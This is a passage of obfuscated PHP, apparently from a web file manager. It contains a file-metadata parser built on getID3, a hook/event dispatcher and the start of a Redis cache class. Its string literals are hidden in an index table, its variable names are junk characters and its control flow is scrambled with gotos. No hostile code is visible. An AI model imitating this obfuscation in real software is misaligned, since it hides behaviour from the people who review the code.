array_pop($a§ÛÂáîˆˆ); } } else { $F¸Ğ¯µØ = $fâöá“¸ÌÈ; ++$Cñ„»¯çô; $d¶íĞË‡Ş– = preg_match($AáõƒäÖÄ†[1573], substr($d…«¡ é–­, $Cñ„»¯çô), $cé…”Ìîè„); if ($AáõƒäÖÄ†[929] == $fâöá“¸ÌÈ && 1 == $d¶íĞË‡Ş–) { $a§ÛÂáîˆˆ = strtr($cé…”Ìîè„[1], $AáõƒäÖÄ†[1574], $AáõƒäÖÄ†[33]); $Cñ„»¯çô += \strlen($cé…”Ìîè„[0]); } elseif (!1 !== ($A ÷Ì‘®¥ê = strpos($d…«¡ é–­, $AáõƒäÖÄ†[932], $Cñ„»¯çô))) { $Cñ„»¯çô = $A ÷Ì‘®¥ê + 1; } } break; default: if ($AáõƒäÖÄ†[1575] == substr($d…«¡ é–­, $Cñ„»¯çô, 6)) { $F¸Ğ¯µØ = $AáõƒäÖÄ†[1575]; $Cñ„»¯çô += 6; } elseif ($AáõƒäÖÄ†[99] == substr($d…«¡ é–­, $Cñ„»¯çô, 4)) { $F¸Ğ¯µØ = $AáõƒäÖÄ†[99]; $Cñ„»¯çô += 4; $a§ÛÂáîˆˆ = $AáõƒäÖÄ†[99]; } elseif ($AáõƒäÖÄ†[1576] == substr($d…«¡ é–­, $Cñ„»¯çô, 4)) { $F¸Ğ¯µØ = $AáõƒäÖÄ†[1577]; $Cñ„»¯çô += 4; $a§ÛÂáîˆˆ = $AáõƒäÖÄ†[1576]; } elseif ($AáõƒäÖÄ†[1578] == substr($d…«¡ é–­, $Cñ„»¯çô, 5)) { $F¸Ğ¯µØ = $AáõƒäÖÄ†[1577]; $Cñ„»¯çô += 5; $a§ÛÂáîˆˆ = $AáõƒäÖÄ†[1578]; } elseif ($AáõƒäÖÄ†[1579] == substr($d…«¡ é–­, $Cñ„»¯çô, 6)) { $F¸Ğ¯µØ = $AáõƒäÖÄ†[1579]; $Cñ„»¯çô += 6; if (1 == preg_match($AáõƒäÖÄ†[1580], substr($d…«¡ é–­, $Cñ„»¯çô), $cé…”Ìîè„)) { $Cñ„»¯çô += strlen($cé…”Ìîè„[0]); $FÈ”³ÌÃôë = $AáõƒäÖÄ†[1581]; $d¶íĞË‡Ş– = preg_match($FÈ”³ÌÃôë, substr($d…«¡ é–­, $Cñ„»¯çô), $cé…”Ìîè„, PREG_OFFSET_CAPTURE); if (1 == $d¶íĞË‡Ş–) { $a§ÛÂáîˆˆ = substr($d…«¡ é–­, $Cñ„»¯çô, $cé…”Ìîè„[0][1]); $Cñ„»¯çô += $cé…”Ìîè„[1][1]; } } } elseif ($AáõƒäÖÄ†[1582] == substr($d…«¡ é–­, $Cñ„»¯çô, 9)) { $F¸Ğ¯µØ = $AáõƒäÖÄ†[1582]; $Cñ„»¯çô += 9; } elseif (1 == preg_match($AáõƒäÖÄ†[1583], substr($d…«¡ é–­, $Cñ„»¯çô, 33), $cé…”Ìîè„)) { $F¸Ğ¯µØ = $AáõƒäÖÄ†[1545]; $Cñ„»¯çô += strlen($cé…”Ìîè„[0]); $a§ÛÂáîˆˆ = intval($cé…”Ìîè„[1]) . $AáõƒäÖÄ†[70] . intval($cé…”Ìîè„[2]); } elseif (1 == preg_match($AáõƒäÖÄ†[1584], substr($d…«¡ é–­, $Cñ„»¯çô, 33), $cé…”Ìîè„)) { $F¸Ğ¯µØ = $AáõƒäÖÄ†[1585]; $a§ÛÂáîˆˆ = intval($cé…”Ìîè„[1]) . $AáõƒäÖÄ†[70] . intval($cé…”Ìîè„[2]); $Cñ„»¯çô += strlen($cé…”Ìîè„[0]); } elseif (($F·Á²À£Ë = strspn($d…«¡ é–­, $AáõƒäÖÄ†[1586], $Cñ„»¯çô)) > 0) { $F¸Ğ¯µØ = $AáõƒäÖÄ†[1587]; $a§ÛÂáîˆˆ = substr($d…«¡ é–­, $Cñ„»¯çô, $F·Á²À£Ë); $Cñ„»¯çô += $F·Á²À£Ë; } break; } goto BòŸçò¬ª; E‰‚Ÿ¼ïÙà: } } class GetInfo { private static $fileTypeArray; public static function get($fÍ¬‡Ú©Á—) { $Bã­ßì‰¶ = IO::info($fÍ¬‡Ú©Á—); return self::infoAdd($Bã­ßì‰¶); } public static function infoAdd(&$Cº¸Õó³æ) { goto dˆàøÉŒÏ; f™¢œŸËÙ‘: $cÙ®Ü¹É„Ş = $Cº¸Õó³æ[$cá“êèÊÕ„[156]]; try { if ($Cº¸Õó³æ[$cá“êèÊÕ„[156]] == $cá“êèÊÕ„[1590]) { $BÃ»Ï³Ì¥ì = self::psdParse($b»Ôãí‹ñÙ); $cÙ®Ü¹É„Ş = $cá“êèÊÕ„[1591]; } else { if ($Cº¸Õó³æ[$cá“êèÊÕ„[156]] == $cá“êèÊÕ„[1592]) { $BÃ»Ï³Ì¥ì = self::pdfParse($b»Ôãí‹ñÙ); } else { $cÙ®Ü¹É„Ş = self::$fileTypeArray[$cá“êèÊÕ„[1593]][$Cº¸Õó³æ[$cá“êèÊÕ„[156]]]; $FàŒÚôµ½Ë = self::$fileTypeArray[$cá“êèÊÕ„[1594]][$cÙ®Ü¹É„Ş][$cá“êèÊÕ„[1595]]; $ešÉáˆŒÔç = @$Cİ‹ßŠˆ->analyze($b»Ôãí‹ñÙ, $Cº¸Õó³æ[$cá“êèÊÕ„[77]], $Cº¸Õó³æ[$cá“êèÊÕ„[28]]); $BÃ»Ï³Ì¥ì = self::parseData($ešÉáˆŒÔç, $FàŒÚôµ½Ë, $Cº¸Õó³æ); } } } catch (Exception $AëöÓØœå) { $BÃ»Ï³Ì¥ì = array($cá“êèÊÕ„[368] => $cÙ®Ü¹É„Ş); } if (!$BÃ»Ï³Ì¥ì) { return; } goto bæœˆÕ’å; dˆàøÉŒÏ: $cá“êèÊÕ„ =& $_SERVER[Õİõş]; static $Cİ‹ßŠˆ; if (!$Cİ‹ßŠˆ) { require SDK_DIR . $cá“êèÊÕ„[1588]; $Cİ‹ßŠˆ = new getID3(); } goto d§ˆéØ¸ÁÃ; d§ˆéØ¸ÁÃ: if (!$Cº¸Õó³æ || $Cº¸Õó³æ[$cá“êèÊÕ„[29]] != $cá“êèÊÕ„[163]) { return; } if (!self::support($Cº¸Õó³æ[$cá“êèÊÕ„[156]]) || isset($Cº¸Õó³æ[$cá“êèÊÕ„[421]])) { return; } $b»Ôãí‹ñÙ = $cá“êèÊÕ„[1589] . $Cº¸Õó³æ[$cá“êèÊÕ„[75]]; goto f™¢œŸËÙ‘; bæœˆÕ’å: $BÃ»Ï³Ì¥ì[$cá“êèÊÕ„[368]] = $cÙ®Ü¹É„Ş; $Cº¸Õó³æ[$cá“êèÊÕ„[421]] = $BÃ»Ï³Ì¥ì; return $Cº¸Õó³æ; goto Cà‰óÅ¹öà; Cà‰óÅ¹öà: } public static function support($EºÏİĞ‰¾æ) { goto cõ„¬¹ˆ×¿; bÚºœÚ½ï„: $BÎ¡Ò—Ãèœ = array($dòë­Æ‹ƒƒ[1592], $dòë­Æ‹ƒƒ[1590]); if (in_array($EºÏİĞ‰¾æ, $BÎ¡Ò—Ãèœ)) { return !0; } if (isset(self::$fileTypeArray[$dòë­Æ‹ƒƒ[1593]][$EºÏİĞ‰¾æ])) { return !0; } goto cÖ×‘Å¥Î; cÖ×‘Å¥Î: return !1; goto e‚£»ˆ¿Ëã; cõ„¬¹ˆ×¿: $dòë­Æ‹ƒƒ =& $_SERVER[Õİõş]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $EºÏİĞ‰¾æ = strtolower($EºÏİĞ‰¾æ); goto bÚºœÚ½ï„; e‚£»ˆ¿Ëã: } private static function parseData($d’¥®¾ã©‚, $AØÚëÎŒÁ‰, $D¬‚©ğËó) { $DøÖÕÑ‰­æ =& $_SERVER[Õİõş]; $c†Ã°Üßá¢ = $d’¥®¾ã©‚[$DøÖÕÑ‰­æ[1596]]; $aƒîµÙ…œ = array(); foreach ($AØÚëÎŒÁ‰ as $F¸—ƒíÛç† => $bç¾ ªÙ«¸) { foreach ($bç¾ ªÙ«¸ as $F †£—’©½) { if (is_array($F †£—’©½)) { $fÁÕîÅƒ£¢ = self::parseData($d’¥®¾ã©‚, $bç¾ ªÙ«¸, $D¬‚©ğËó); if ($fÁÕîÅƒ£¢) { $aƒîµÙ…œ[$F¸—ƒíÛç†] = $fÁÕîÅƒ£¢; } break; } $b§»¦’ƒà = str_replace($DøÖÕÑ‰­æ[1370], $c†Ã°Üßá¢, $F †£—’©½); $fÁÕîÅƒ£¢ = _get($d’¥®¾ã©‚, $b§»¦’ƒà); $fÁÕîÅƒ£¢ = is_array($fÁÕîÅƒ£¢) ? $fÁÕîÅƒ£¢[0] : $fÁÕîÅƒ£¢; if ($fÁÕîÅƒ£¢) { break; } } if ($fÁÕîÅƒ£¢ || $fÁÕîÅƒ£¢ === 0 || $fÁÕîÅƒ£¢ === !1) { $fÁÕîÅƒ£¢ = self::valueReset($F †£—’©½, $fÁÕîÅƒ£¢, $F¸—ƒíÛç†); if ($fÁÕîÅƒ£¢ !== null) { $aƒîµÙ…œ[$F¸—ƒíÛç†] = $fÁÕîÅƒ£¢; } } } $aƒîµÙ…œ = self::valueResetAll($aƒîµÙ…œ, $D¬‚©ğËó); return $aƒîµÙ…œ; } private static function psdParse($a¥Â¶‡Ÿ¼ë) { $d‘Øø½¹®ß =& $_SERVER[Õİõş]; if (IO::fileSubstr($a¥Â¶‡Ÿ¼ë, 0, 4) != $d‘Øø½¹®ß[1597]) { return !1; } $E‹ó¤³Ï± = getImageSize($a¥Â¶‡Ÿ¼ë, $añ‚Ÿœ·¦); if (!$E‹ó¤³Ï±) { return; } $EÏæë„·İØ = array($d‘Øø½¹®ß[1512] => $E‹ó¤³Ï±[0], $d‘Øø½¹®ß[1514] => $E‹ó¤³Ï±[1]); return $EÏæë„·İØ; } private static function pdfParse($Dê¸ÔÙ¿ ·) { return FileParsePdf::parse($Dê¸ÔÙ¿ ·); } private static function fileTypeParse() { $B¹ƒ‹ˆÒ¹ =& $_SERVER[Õİõş]; $BãÈáÖŞÉƒ = self::fileTypeArray(); $Cª½ô‹·ìÏ = array(); foreach ($BãÈáÖŞÉƒ as $b¼êŠ·×ñÓ => $e§¯ø™¸º) { $Bºˆ’Æ¼ù¿ = _get($e§¯ø™¸º, $B¹ƒ‹ˆÒ¹[156], $B¹ƒ‹ˆÒ¹[33]); $C½æâÃñîÑ = is_string($Bºˆ’Æ¼ù¿) ? explode($B¹ƒ‹ˆÒ¹[47], $Bºˆ’Æ¼ù¿) : $Bºˆ’Æ¼ù¿; if (!$C½æâÃñîÑ) { continue; } foreach ($C½æâÃñîÑ as $Bºˆ’Æ¼ù¿) { $Bºˆ’Æ¼ù¿ = strtolower(trim($Bºˆ’Æ¼ù¿)); if (!$Bºˆ’Æ¼ù¿) { continue; } $Cª½ô‹·ìÏ[$Bºˆ’Æ¼ù¿] = $b¼êŠ·×ñÓ; } $BãÈáÖŞÉƒ[$b¼êŠ·×ñÓ][$B¹ƒ‹ˆÒ¹[156]] = array_keys($Cª½ô‹·ìÏ); $BãÈáÖŞÉƒ[$b¼êŠ·×ñÓ][$B¹ƒ‹ˆÒ¹[1595]] = self::parseKeyMap($e§¯ø™¸º[$B¹ƒ‹ˆÒ¹[1595]]); } return array($B¹ƒ‹ˆÒ¹[1594] => $BãÈáÖŞÉƒ, $B¹ƒ‹ˆÒ¹[1593] => $Cª½ô‹·ìÏ); } private static function parseKeyMap($FÑâïÏÅŠã) { $cò¥¼ÈÕä =& $_SERVER[Õİõş]; foreach ($FÑâïÏÅŠã as $F½ äéæ†´ => $aøøÔğ¼¸) { if (is_array($aøøÔğ¼¸)) { $d‘±¢…Â = self::parseKeyMap($aøøÔğ¼¸); if ($d‘±¢…Â) { $FÑâïÏÅŠã[$F½ äéæ†´] = $d‘±¢…Â; } continue; } $bªáµğ— = explode($cò¥¼ÈÕä[47], $aøøÔğ¼¸); $Bí¢æ¸«Ğª = array(); foreach ($bªáµğ— as $C¡À™Æ‡ôº) { $C¡À™Æ‡ôº = trim($C¡À™Æ‡ôº); if (!$C¡À™Æ‡ôº) { continue; } if (preg_match($cò¥¼ÈÕä[1598], $C¡À™Æ‡ôº, $Bå¤Âáê¿)) { $DÎùÏÂŒĞÁ = explode($cò¥¼ÈÕä[267], $Bå¤Âáê¿[1]); foreach ($DÎùÏÂŒĞÁ as $CÚáÌ×„ÈÖ) { $Bí¢æ¸«Ğª[] = str_replace($Bå¤Âáê¿[0], $CÚáÌ×„ÈÖ, $C¡À™Æ‡ôº); } } else { $Bí¢æ¸«Ğª[] = $C¡À™Æ‡ôº; } } $FÑâïÏÅŠã[$F½ äéæ†´] = $Bí¢æ¸«Ğª; } return $FÑâïÏÅŠã; } private static function valueResetAll($d¯ÊÈ‹¶½ğ, $b”ØÄ¯ÂÕÈ) { goto fÀÚôãÂÓ; a¢õ¯¼—äö: return $d¯ÊÈ‹¶½ğ; goto aİÌäÇ¬Ç; fÀÚôãÂÓ: $eºò‡ˆâ©š =& $_SERVER[Õİõş]; if (isset($d¯ÊÈ‹¶½ğ[$eºò‡ˆâ©š[1599]])) { $f‹ìà…ºòö = ceil($d¯ÊÈ‹¶½ğ[$eºò‡ˆâ©š[1599]]); $aÉĞ¢ŠïÍÈ = intval($f‹ìà…ºòö / 3600); $eÌŞùÄ™Ç« = intval(($f‹ìà…ºòö - $aÉĞ¢ŠïÍÈ * 3600) / 60); $AÄäàƒ‹ĞÅ = $f‹ìà…ºòö % 60; $d¯ÊÈ‹¶½ğ[$eºò‡ˆâ©š[1600]] = sprintf($eºò‡ˆâ©š[1601], $aÉĞ¢ŠïÍÈ, $eÌŞùÄ™Ç«, $AÄäàƒ‹ĞÅ); if ($aÉĞ¢ŠïÍÈ == 0) { $d¯ÊÈ‹¶½ğ[$eºò‡ˆâ©š[1600]] = sprintf($eºò‡ˆâ©š[1602], $eÌŞùÄ™Ç«, $AÄäàƒ‹ĞÅ); } } $a–òà‡íµŠ = _get($d¯ÊÈ‹¶½ğ, $eºò‡ˆâ©š[1603]); goto aèŞˆÃ®éë; f§¾îµ«¯: $c…³©á‹è— = _get($d¯ÊÈ‹¶½ğ, $eºò‡ˆâ©š[1611], $eºò‡ˆâ©š[33]); $b÷‰…ˆëŒ× = $BÅ‹ïÜ÷ . $Aè¿˜³’ªØ . $c…³©á‹è—; if ($b÷‰…ˆëŒ× && get_charset($b÷‰…ˆëŒ×) != $eºò‡ˆâ©š[322]) { $d¯ÊÈ‹¶½ğ[$eºò‡ˆâ©š[1608]][$eºò‡ˆâ©š[1325]] = iconv_to($d¯ÊÈ‹¶½ğ[$eºò‡ˆâ©š[1608]][$eºò‡ˆâ©š[1325]], get_charset($b÷‰…ˆëŒ×), $eºò‡ˆâ©š[322]); $d¯ÊÈ‹¶½ğ[$eºò‡ˆâ©š[1608]][$eºò‡ˆâ©š[1612]] = iconv_to($d¯ÊÈ‹¶½ğ[$eºò‡ˆâ©š[1608]][$eºò‡ˆâ©š[1612]], get_charset($b÷‰…ˆëŒ×), $eºò‡ˆâ©š[322]); $d¯ÊÈ‹¶½ğ[$eºò‡ˆâ©š[1608]][$eºò‡ˆâ©š[1613]] = iconv_to($d¯ÊÈ‹¶½ğ[$eºò‡ˆâ©š[1608]][$eºò‡ˆâ©š[1613]], get_charset($b÷‰…ˆëŒ×), $eºò‡ˆâ©š[322]); } goto a¢õ¯¼—äö; aèŞˆÃ®éë: if ($a–òà‡íµŠ) { $D»‰ô¨–ºã = IO_PATH_SYSTEM_TEMP . $eºò‡ˆâ©š[1604] . KodIO::hashPath($b”ØÄ¯ÂÕÈ) . $eºò‡ˆâ©š[1605]; $d¯ÊÈ‹¶½ğ[$eºò‡ˆâ©š[1606]] = Action($eºò‡ˆâ©š[1607])->pluginCacheFileSet($D»‰ô¨–ºã, $a–òà‡íµŠ); unset($d¯ÊÈ‹¶½ğ[$eºò‡ˆâ©š[1608]][$eºò‡ˆâ©š[1591]]); } $BÅ‹ïÜ÷ = _get($d¯ÊÈ‹¶½ğ, $eºò‡ˆâ©š[1609], $eºò‡ˆâ©š[33]); $Aè¿˜³’ªØ = _get($d¯ÊÈ‹¶½ğ, $eºò‡ˆâ©š[1610], $eºò‡ˆâ©š[33]); goto f§¾îµ«¯; aİÌäÇ¬Ç: } private static function valueReset($b†ùÌ˜ØŠ², $F·¶½íÑÊï, $aÔ©¦”ŒÊŒ) { $fç¼çÁØ“º =& $_SERVER[Õİõş]; $CŞŒÔÍ©Üœ = $fç¼çÁØ“º[1529]; switch ($b†ùÌ˜ØŠ²) { case $fç¼çÁØ“º[1614]: $F·¶½íÑÊï = $F·¶½íÑÊï == $fç¼çÁØ“º[83] ? $fç¼çÁØ“º[1615] : $fç¼çÁØ“º[1616]; break; case $fç¼çÁØ“º[1617]: $F·¶½íÑÊï = $F·¶½íÑÊï ? $F·¶½íÑÊï : null; break; default: break; } switch ($aÔ©¦”ŒÊŒ) { case $fç¼çÁØ“º[1618]: $F·¶½íÑÊï = round($F·¶½íÑÊï, 2); break; case $fç¼çÁØ“º[183]: case $fç¼çÁØ“º[106]: if ($F·¶½íÑÊï < 0) { $F·¶½íÑÊï = null; } else { if (is_numeric($F·¶½íÑÊï)) { $F·¶½íÑÊï = date($CŞŒÔÍ©Üœ, $F·¶½íÑÊï); } } break; default: break; } return $F·¶½íÑÊï; } private static function fileTypeArray() { $cĞ‡£˜Ğà =& $_SERVER[Õİõş]; return array($cĞ‡£˜Ğà[1591] => array($cĞ‡£˜Ğà[156] => $cĞ‡£˜Ğà[1619] . $cĞ‡£˜Ğà[1620], $cĞ‡£˜Ğà[1595] => array($cĞ‡£˜Ğà[1512] => $cĞ‡£˜Ğà[1621], $cĞ‡£˜Ğà[1514] => $cĞ‡£˜Ğà[1622], $cĞ‡£˜Ğà[1623] => $cĞ‡£˜Ğà[1624], $cĞ‡£˜Ğà[1625] => $cĞ‡£˜Ğà[1626], $cĞ‡£˜Ğà[183] => $cĞ‡£˜Ğà[1627], $cĞ‡£˜Ğà[106] => $cĞ‡£˜Ğà[1628], $cĞ‡£˜Ğà[1629] => $cĞ‡£˜Ğà[1630], $cĞ‡£˜Ğà[1631] => $cĞ‡£˜Ğà[1632], $cĞ‡£˜Ğà[1633] => $cĞ‡£˜Ğà[1634], $cĞ‡£˜Ğà[1635] => $cĞ‡£˜Ğà[1636], $cĞ‡£˜Ğà[1637] => $cĞ‡£˜Ğà[1638], $cĞ‡£˜Ğà[1639] => $cĞ‡£˜Ğà[1640], $cĞ‡£˜Ğà[1641] => $cĞ‡£˜Ğà[1642], $cĞ‡£˜Ğà[1643] => array($cĞ‡£˜Ğà[1644] => $cĞ‡£˜Ğà[1645], $cĞ‡£˜Ğà[1646] => $cĞ‡£˜Ğà[1647], $cĞ‡£˜Ğà[1648] => $cĞ‡£˜Ğà[1649]), $cĞ‡£˜Ğà[1650] => $cĞ‡£˜Ğà[1651], $cĞ‡£˜Ğà[1652] => $cĞ‡£˜Ğà[1653], $cĞ‡£˜Ğà[1654] => $cĞ‡£˜Ğà[1655], $cĞ‡£˜Ğà[1656] => $cĞ‡£˜Ğà[1657], $cĞ‡£˜Ğà[1658] => array($cĞ‡£˜Ğà[1659] => $cĞ‡£˜Ğà[1660], $cĞ‡£˜Ğà[1661] => $cĞ‡£˜Ğà[1662], $cĞ‡£˜Ğà[1663] => $cĞ‡£˜Ğà[1664], $cĞ‡£˜Ğà[1665] => $cĞ‡£˜Ğà[1666], $cĞ‡£˜Ğà[1667] => $cĞ‡£˜Ğà[1668], $cĞ‡£˜Ğà[1669] => $cĞ‡£˜Ğà[1670], $cĞ‡£˜Ğà[1671] => $cĞ‡£˜Ğà[1672], $cĞ‡£˜Ğà[1673] => $cĞ‡£˜Ğà[1674], $cĞ‡£˜Ğà[1675] => $cĞ‡£˜Ğà[1676], $cĞ‡£˜Ğà[1677] => $cĞ‡£˜Ğà[1678], $cĞ‡£˜Ğà[1679] => $cĞ‡£˜Ğà[1680]))), $cĞ‡£˜Ğà[1681] => array($cĞ‡£˜Ğà[156] => $cĞ‡£˜Ğà[1682] . $cĞ‡£˜Ğà[1683], $cĞ‡£˜Ğà[1595] => array($cĞ‡£˜Ğà[1599] => $cĞ‡£˜Ğà[1684], $cĞ‡£˜Ğà[183] => $cĞ‡£˜Ğà[1685], $cĞ‡£˜Ğà[106] => $cĞ‡£˜Ğà[1686], $cĞ‡£˜Ğà[1631] => $cĞ‡£˜Ğà[1687], $cĞ‡£˜Ğà[1688] => $cĞ‡£˜Ğà[1689], $cĞ‡£˜Ğà[1690] => $cĞ‡£˜Ğà[1617], $cĞ‡£˜Ğà[1691] => $cĞ‡£˜Ğà[1692], $cĞ‡£˜Ğà[1693] => $cĞ‡£˜Ğà[1694], $cĞ‡£˜Ğà[1695] => $cĞ‡£˜Ğà[1696], $cĞ‡£˜Ğà[1608] => array($cĞ‡£˜Ğà[1325] => $cĞ‡£˜Ğà[1697], $cĞ‡£˜Ğà[1612] => $cĞ‡£˜Ğà[1698], $cĞ‡£˜Ğà[1613] => $cĞ‡£˜Ğà[1699], $cĞ‡£˜Ğà[1700] => $cĞ‡£˜Ğà[1701], $cĞ‡£˜Ğà[1702] => $cĞ‡£˜Ğà[1703], $cĞ‡£˜Ğà[1704] => $cĞ‡£˜Ğà[1705], $cĞ‡£˜Ğà[1591] => $cĞ‡£˜Ğà[1706]))), $cĞ‡£˜Ğà[1707] => array($cĞ‡£˜Ğà[156] => $cĞ‡£˜Ğà[1708] . $cĞ‡£˜Ğà[1709], $cĞ‡£˜Ğà[1595] => array($cĞ‡£˜Ğà[1512] => $cĞ‡£˜Ğà[1710], $cĞ‡£˜Ğà[1514] => $cĞ‡£˜Ğà[1711], $cĞ‡£˜Ğà[1599] => $cĞ‡£˜Ğà[1684], $cĞ‡£˜Ğà[183] => $cĞ‡£˜Ğà[1712], $cĞ‡£˜Ğà[106] => $cĞ‡£˜Ğà[1713], $cĞ‡£˜Ğà[1618] => $cĞ‡£˜Ğà[1714], $cĞ‡£˜Ğà[1695] => $cĞ‡£˜Ğà[1715], $cĞ‡£˜Ğà[1691] => $cĞ‡£˜Ğà[1716], $cĞ‡£˜Ğà[1631] => $cĞ‡£˜Ğà[1717], $cĞ‡£˜Ğà[1681] => array($cĞ‡£˜Ğà[1690] => $cĞ‡£˜Ğà[1617], $cĞ‡£˜Ğà[1718] => $cĞ‡£˜Ğà[1719], $cĞ‡£˜Ğà[1688] => $cĞ‡£˜Ğà[1689], $cĞ‡£˜Ğà[1695] => $cĞ‡£˜Ğà[1696], $cĞ‡£˜Ğà[1691] => $cĞ‡£˜Ğà[1720], $cĞ‡£˜Ğà[1693] => $cĞ‡£˜Ğà[1694]))), $cĞ‡£˜Ğà[1721] => array($cĞ‡£˜Ğà[1595] => array($cĞ‡£˜Ğà[1722] => $cĞ‡£˜Ğà[1723], $cĞ‡£˜Ğà[1724] => $cĞ‡£˜Ğà[1725])), $cĞ‡£˜Ğà[1726] => array($cĞ‡£˜Ğà[1595] => array())); } } class Hook { private static $events = array(); public static function get($Bó®Æ£Ñ = false) { if (!$Bó®Æ£Ñ) { return self::$events; } else { return self::$events[$Bó®Æ£Ñ]; } } public static function apply($f˜›òƒÁîö, $b ò“ƒ»Ü = array()) { $b´£ÙîŒ„  = ActionApply($f˜›òƒÁîö, $b ò“ƒ»Ü); if (is_string($f˜›òƒÁîö)) { Hook::trigger($f˜›òƒÁîö); } return $b´£ÙîŒ„ ; } public static function bind($eï¿ĞŒÂÕ“, $Dã±‹Êõ, $Eø–¦“Ò‹ = false) { $Cìõù¶Íö =& $_SERVER[Õİõş]; if (!isset(self::$events[$eï¿ĞŒÂÕ“])) { self::$events[$eï¿ĞŒÂÕ“] = array(); } self::$events[$eï¿ĞŒÂÕ“][] = array($Cìõù¶Íö[1727] => $Dã±‹Êõ, $Cìõù¶Íö[1728] => $Eø–¦“Ò‹, $Cìõù¶Íö[1729] => 0); } public static function once($CÛÏÇ‰ÔÑ, $dùÎ øÃÕâ) { self::bind($CÛÏÇ‰ÔÑ, $dùÎ øÃÕâ, !0); } public static function unbind($C¶¦¥ÓÎ‚ß, $EÅ™íö¢Ü = false) { if (!$EÅ™íö¢Ü) { self::$events[$C¶¦¥ÓÎ‚ß] = array(); return; } $cäÈÏ‹Ÿ£ˆ = self::$events[$C¶¦¥ÓÎ‚ß]; self::$events[$C¶¦¥ÓÎ‚ß] = array(); if (!is_array($cäÈÏ‹Ÿ£ˆ)) { return; } for ($fôË¬ôï = 0; $fôË¬ôï < count($cäÈÏ‹Ÿ£ˆ); $fôË¬ôï++) { if ($cäÈÏ‹Ÿ£ˆ[$fôË¬ôï][$_SERVER[Õİõş][1727]] == $EÅ™íö¢Ü) { continue; } self::$events[$C¶¦¥ÓÎ‚ß][] = $cäÈÏ‹Ÿ£ˆ[$fôË¬ôï]; } } public static function filter($C¯£”±¢í, $DˆáÌ¢Ú÷˜) { goto cÍë³†“ª; cÍë³†“ª: $bñ¾•ççÖç =& $_SERVER[Õİõş]; $Dä³Ë‚òÒ = self::$events; if (!isset($Dä³Ë‚òÒ[$C¯£”±¢í])) { return $DˆáÌ¢Ú÷˜; } goto c¾ĞÅ’¼³Á; f—Ñ¯ÌÛãÁ: for ($Aƒ‰Ú ¢™ = 0; $Aƒ‰Ú ¢™ < count($D‹œ£ˆÚ); $Aƒ‰Ú ¢™++) { $BäØ‹’Ô“¡ = $D‹œ£ˆÚ[$Aƒ‰Ú ¢™]; if ($BäØ‹’Ô“¡[$bñ¾•ççÖç[1728]] && $BäØ‹’Ô“¡[$bñ¾•ççÖç[1729]] > 1) { continue; } self::$events[$C¯£”±¢í][$Aƒ‰Ú ¢™][$bñ¾•ççÖç[1729]] = $BäØ‹’Ô“¡[$bñ¾•ççÖç[1729]] + 1; $Dóµï¼­ï‡ = self::apply($BäØ‹’Ô“¡[$bñ¾•ççÖç[1727]], array($aÈªĞÑ²è)); if (gettype($Dóµï¼­ï‡) == gettype($aÈªĞÑ²è)) { $aÈªĞÑ²è = $Dóµï¼­ï‡; } } return $aÈªĞÑ²è; goto dÉœŠÒñ”; c¾ĞÅ’¼³Á: $D‹œ£ˆÚ = $Dä³Ë‚òÒ[$C¯£”±¢í]; $aÈªĞÑ²è = $DˆáÌ¢Ú÷˜; if (!is_array($D‹œ£ˆÚ) || count($D‹œ£ˆÚ) == 0) { return $aÈªĞÑ²è; } goto f—Ñ¯ÌÛãÁ; dÉœŠÒñ”: } public static function trigger($fƒÁßÖ©¹») { goto BÏÂèÁ¥Š®; CÆ¾¶ô÷ š: return $B´å¹ äøŠ; goto eÕ†‡ÚĞ“ˆ; b›Ÿ»Õ„ä: if (!isset($CàÔ»ì¢ â[$fƒÁßÖ©¹»])) { return $B´å¹ äøŠ; } $c¿‡¢™Ò« = $CàÔ»ì¢ â[$fƒÁßÖ©¹»]; if (!is_array($c¿‡¢™Ò«) || count($c¿‡¢™Ò«) == 0) { return $B´å¹ äøŠ; } goto B…ÑÑ‘í•Ÿ; B…ÑÑ‘í•Ÿ: $cùÂêÓ…ÈÙ = func_get_args(); array_shift($cùÂêÓ…ÈÙ); for ($FÔ§´¸ˆ¿ê = 0; $FÔ§´¸ˆ¿ê < count($c¿‡¢™Ò«); $FÔ§´¸ˆ¿ê++) { $bÌ“Üä«†¦ = $c¿‡¢™Ò«[$FÔ§´¸ˆ¿ê]; if ($bÌ“Üä«†¦[$a²ÚÄã©½µ[1728]] && $bÌ“Üä«†¦[$a²ÚÄã©½µ[1729]] > 1) { continue; } if (defined($a²ÚÄã©½µ[1730]) && GLOBAL_LOG_HOOK) { write_log($fƒÁßÖ©¹» . $a²ÚÄã©½µ[1731] . $bÌ“Üä«†¦[$a²ÚÄã©½µ[1727]], $a²ÚÄã©½µ[1732]); } self::$events[$fƒÁßÖ©¹»][$FÔ§´¸ˆ¿ê][$a²ÚÄã©½µ[1729]] = $bÌ“Üä«†¦[$a²ÚÄã©½µ[1729]] + 1; $c¸ÎòùŠ¯ˆ = self::apply($bÌ“Üä«†¦[$a²ÚÄã©½µ[1727]], $cùÂêÓ…ÈÙ); if (defined($a²ÚÄã©½µ[1730]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $a²ÚÄã©½µ[1732]); if ($bÌ“Üä«†¦[$a²ÚÄã©½µ[1729]] == 200) { $bøáà‚ˆ¢¨ = is_array($bÌ“Üä«†¦[$a²ÚÄã©½µ[1727]]) ? json_encode_force($bÌ“Üä«†¦[$a²ÚÄã©½µ[1727]]) : $bÌ“Üä«†¦[$a²ÚÄã©½µ[1727]]; write_log($a²ÚÄã©½µ[1733] . $fƒÁßÖ©¹» . $a²ÚÄã©½µ[1734] . $bøáà‚ˆ¢¨, $a²ÚÄã©½µ[1735]); } } $B´å¹ äøŠ = is_null($c¸ÎòùŠ¯ˆ) ? $B´å¹ äøŠ : $c¸ÎòùŠ¯ˆ; } goto CÆ¾¶ô÷ š; BÏÂèÁ¥Š®: $a²ÚÄã©½µ =& $_SERVER[Õİõş]; $CàÔ»ì¢ â = self::$events; $B´å¹ äøŠ = !1; goto b›Ÿ»Õ„ä; eÕ†‡ÚĞ“ˆ: } } goto Bˆƒƒ†Óº; eõÆêÛï‡Ê: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($d®óÌšİÉ, $c”ôî ×ƒº) { $d™É²Ñª£Â =& $_SERVER[Õİõş]; if (!class_exists($d™É²Ñª£Â[789])) { show_json($d™É²Ñª£Â[790], !1); } $this->cacheTime = $c”ôî ×ƒº; $béÆçÈ‹Ñ· = isset($d®óÌšİÉ[$d™É²Ñª£Â[791]]) ? 